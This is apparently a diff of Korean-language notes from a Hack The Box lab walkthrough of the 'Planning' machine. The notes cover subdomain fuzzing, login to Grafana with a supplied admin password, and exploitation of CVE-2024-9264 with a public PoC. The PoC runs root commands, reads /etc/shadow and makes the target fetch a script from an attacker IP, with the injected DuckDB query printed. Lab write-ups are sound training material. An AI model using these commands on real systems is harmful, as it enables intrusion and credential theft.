@@ -23,159 +23,160 @@ OS and Service detection performed. Please report any incorrect results at https
 내부 도메인으로 변경
 
 ┌──(root㉿codespaces-38cdce)-[/]
-└─# echo "10.10.32.103 planning.htb" >> /etc/hosts
+└─# echo "10.10.11.68 planning.htb" >> /etc/hosts
 
-┌──(root㉿codespaces-38cdce)-[/]
-└─# curl http://planning.htb
-탐색
+# ffuf 사용
+ ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100
 
-# 1. detail.php 파라미터 테스트
-curl -i "http://planning.htb/detail.php?id=1"
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-# 2. SQL 인젝션 의심 파라미터에 따옴표 넣기
-curl -i "http://planning.htb/detail.php?id=1'"
+       v2.1.0-dev
+________________________________________________
 
-# 3. XSS 테스트
-curl -i "http://planning.htb/detail.php?id=<script>alert(1)</script>"
+ :: Method           : GET
+ :: URL              : http://planning.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
+ :: Header           : Host: FUZZ.planning.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 178
+________________________________________________
 
-# 4. 다른 페이지 폼 확인 (contact.php 등)
-curl -i "http://planning.htb/contact.php"
+grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 662ms]
+:: Progress: [66967/151265] :: Job [1/1] :: 87 req/sec :: Duration: [0:12:39] :: Errors: 0 ::
 
-# 5. robots.txt 존재 여부 확인
-curl -i "http://planning.htb/robots.txt"
+┌──(root㉿docker-desktop)-[/]
+└─# http http://grafana.planning.htb/
+HTTP/1.1 302 Found
+Cache-Control: no-store
+Connection: keep-alive
+Content-Length: 29
+Content-Type: text/html; charset=utf-8
+Date: Tue, 03 Jun 2025 09:34:15 GMT
+Location: /login
+Server: nginx/1.24.0 (Ubuntu)
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-Xss-Protection: 1; mode=block
 
-# 6. 기본 디렉터리 리스팅 여부 확인
-curl -i "http://planning.htb/uploads/"
-# 1. 취약점 검색에 가장 많이 쓰이는 CLI 도구: 'searchsploit'
-# Exploit-DB에 등록된 익스플로잇 및 취약점 정보를 검색 가능
+<a href="/login">Found</a>.
 
-# 설치 (Debian/Ubuntu 기준)
+
+
+┌──(root㉿docker-desktop)-[/]
+└─# http http://grafana.planning.htb/login
+
+# 버전 확인
+http http://grafana.planning.htb/login | grep version
+Grafana v11.0.0
+
+# 취약점 검색
 sudo apt update
 sudo apt install exploitdb
-
-# 설치 확인
-searchsploit -v
-
-# 사용법 예시: nginx 1.24.0 관련 취약점 검색
-searchsploit nginx 1.24.0
-
-
-# 1. GoBuster 설치 (Debian/Ubuntu)
-sudo apt update
-sudo apt install gobuster
-
-# 워드리스트 설치
-sudo apt update
-sudo apt install wordlists
-
-보통 설치하면 위치는
-/usr/share/wordlists 에 설치됨
-
-# 2. 디렉토리 브루트포싱 기본 명령어 예시
-gobuster dir -u http://planning.htb/ -w /usr/share/wordlists/seclists -t 10 -o gobuster_result.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://planning.htb/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/seclists
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-
-Error: error on running gobuster: failed to get number of lines: read /usr/share/wordlists/seclists: is a directory
-
-
-# 설명:
-# - dir      : 디렉토리 탐색 모드
-# - -u       : 타겟 URL
-# - -w       : 워드리스트 경로 (기본 디렉토리/파일 리스트)
-# - -t       : 쓰레드 수 (속도 조절)
-# - -o       : 결과 출력 파일 지정
-
-# sqlMap OSCP 사용 전면 금지
-
-# 1. 기본 SQL 인젝션 검사
-# URL의 id 파라미터가 SQL 인젝션 취약한지 자동 검사
-sqlmap -u "http://planning.htb/detail.php?id=1" --batch
-
-# 2. 데이터베이스 목록 추출
-# 취약점 발견 시 서버 내 모든 DB 이름 추출
-sqlmap -u "http://planning.htb/detail.php?id=1" --dbs --batch
-
-# 3. 특정 DB의 테이블 목록 추출
-# 지정한 DB의 모든 테이블 이름 추출
-sqlmap -u "http://planning.htb/detail.php?id=1" -D database_name --tables --batch
-
-# SQL 인젝션 사용 금지로 인해 자체 스크립트 사용
-# /etc/hosts 추가
-/vpn/scan/SQLi.sh -u "http://planning.htb/detail.php?id=1" --payloads /vpn/SQLi/Generic-SQLi.txt
-/vpn/scan/debug_sqli.sh http://planning.hub/detail.php?id=1 /vpn/SQLi
-
-
-# 고부스터용 파일 합치기 서브도메인 DNS
-cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-    /usr/share/wordlists/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt \
-    > /tmp/combined_subdomains.txt
-
-gobuster dns -d planning.htb -w /tmp/combined_subdomains.txt -t 50 -o subdomain_result.txt
-
-
-
-# 서브도메인 검색 결과
-┌──(root㉿codespaces-38cdce)-[/]
-└─# gobuster dns -d planning.htb -w /tmp/combined_subdomains.txt -t 50 -o subdomain_result.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Domain:     planning.htb
-[+] Threads:    50
-[+] Timeout:    1s
-[+] Wordlist:   /tmp/combined_subdomains.txt
-===============================================================
-Starting gobuster in DNS enumeration mode
-===============================================================
-Found: grafana.planning.htb
-
-Progress: 1618280 / 1618281 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-┌──(root㉿codespaces-38cdce)-[/]
-└─# cat subdomain_result.txt 
-Found: grafana.planning.htb
-
-
-# 그라파나 서브도메인 발견 -> DNS 설정
-echo "10.10.32.103 grafana.planning.htb" >> /etc/hosts
-curl -L http://grafana.planning.htb
-
-
-# Exploit-DB 설치
-apt update && apt install exploitdb
+# 업데이트
 searchsploit -u
-mkdir -p ~/tools
-cd ~/tools
-git clone https://gitlab.com/exploit-database/exploitdb.git
-cd exploitdb
+# 안 나옴
+searchsploit grafana
 
-# 위치 찾기
-find / -type d -name exploitdb 2>/dev/null
-/usr/share/doc/exploitdb
-/usr/share/exploitdb
-/exploitdb
+# 핵더박스측 제공 정보를 통한 로그인을 위해 폼 확인
+http http://grafana.planning.htb/login | login
 
-# Exploit-DB에서 Grafana 관련 취약점 검색
-grep -ri grafana exploits/
+```
+POST /login
+Content-Type: application/json
+
+{
+  "user": "admin",
+  "password": "0D5oT70Fq13EvB5r"
+}
+
+```
+
+# 로그인
+curl -c cookies.txt -X POST http://grafana.planning.htb/login \
+  -H "Content-Type: application/json" \
+  -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'
+
+┌──(root㉿docker-desktop)-[/]
+└─# curl -c cookies.txt -X POST http://grafana.planning.htb/login \
+  -H "Content-Type: application/json" \
+  -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'
+# 로그인 성공
+{"message":"Logged in","redirectUrl":"/"}
+-c: 쿠키를 저장할 파일
+-X POST: HTTP 메소드 지정
 
 
-# 공식 CVE 자료도 연계하기
-# grafana 검색 -> 11.0 검색
-https://cve.mitre.org
+# 저장된 쿠키로 본격 접근
+curl -b cookies.txt http://grafana.planning.htb/
+
+
+# duckduckgo 설치
+apt update
+apt install ddgr
+# 삭제
+apt remove ddgr
+# 검색
+ddgr grafana 11 cve
+
+# grafana 11.0.0 cve poc 구글링
+https://github.com/nollium/CVE-2024-9264
+
+
+# pyton 가상화 실행
+
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+
+# 취약점 실행
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la /" http://grafana.planning.htb
+
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name user | 2>/dev/null" http://grafana.planning.htb
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/gpasswd
+
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "id" http://grafana.planning.htb
+uid=0(root) gid=0(root) groups=0(root)
+
+
+# kali 리버스 쉘 준비
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
+python3 -m http.server 8000
+
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/passwd')" http://grafana.planning.htb
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/shadow')" http://grafana.planning.htb
+
+# 본격 쉘 실행
+python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.12:8080/linenum.sh" http://grafana.planning.htb
+
+[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Executing command: wget http://10.10.16.12:8080/linenum.sh
+[+] Successfully ran duckdb query:
+[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('wget http://10.10.16.12:8080/linenum.sh >/tmp/grafana_cmd_output 2>&1 |'):
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
+--2025-06-03 13:48:11--  http://10.10.16.12:8080/linenum.sh
+Connecting to 10.10.16.12:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46631 (46K) [text/x-sh]
+Saving to: 'linenum.sh'
+
+     0K .......... .......... .......... .......... .....     100% 17.7K=2.6s
+
+2025-06-03 13:48:17 (17.7 KB/s) - 'linenum.sh' saved [46631/46631]
+
